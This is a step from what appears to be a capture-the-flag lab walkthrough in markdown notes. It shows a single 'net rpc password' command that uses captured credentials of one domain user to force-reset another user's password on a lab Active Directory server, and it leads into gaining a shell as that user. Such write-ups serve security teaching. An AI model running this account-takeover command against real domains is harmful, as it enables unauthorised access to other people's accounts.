
As you see on the previous step, you can change the J.Smith's password.

![[Force_change_password.png]]

#Attaking_Machine 
Run the following code:

```
net rpc password "j.smith" "Password123@" -U "k2.thm"/"j.bold"%"#8rockyou" -S K2Server.k2.thm
```

The new password is `Password123@`.


**Next step:** [[Shell as J.Smith]]
